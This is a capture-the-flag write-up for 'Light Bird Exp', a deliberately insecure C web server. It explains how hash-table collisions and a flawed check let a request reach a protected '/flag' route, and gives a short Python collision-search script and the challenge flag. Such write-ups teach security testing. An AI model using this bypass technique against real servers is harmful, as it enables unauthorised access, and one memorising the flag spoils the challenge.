# Light Bird Exp

## Description
This challenge is based on a C web server created by the author, it is a simple and evidently insecure version of route management.

## Solution
In this case a hash table is used to match the routes to the resources, however in the event of a collision the value is moved, therefore with a bad hash function like the one present in the program and for an inefficient width the risk of collision is very high , by exploiting a minor error in the control function it is possible to direct the search function to any resource, evading the controls.

```python

def hash( key:str, mod:int ) -> int:
    hash_value = 0
    for c in key:
        hash_value = (hash_value * 31 + ord(c)) % 4294967296
    return hash_value % mod


pointer = hash( '/flag', 100 )

for i in range( 1000 ):
    if pointer + 1 == hash( f'/flag{i}', 100 ):
        print(f'/flag{i}')
        break

```
## Flag
`CodeVinciCTF{Th15_1s_mY_n3w_r3411y_f4s7_4nd_3ff1c13N7_c_S3rv3r}`

## Author
`sDibuon`


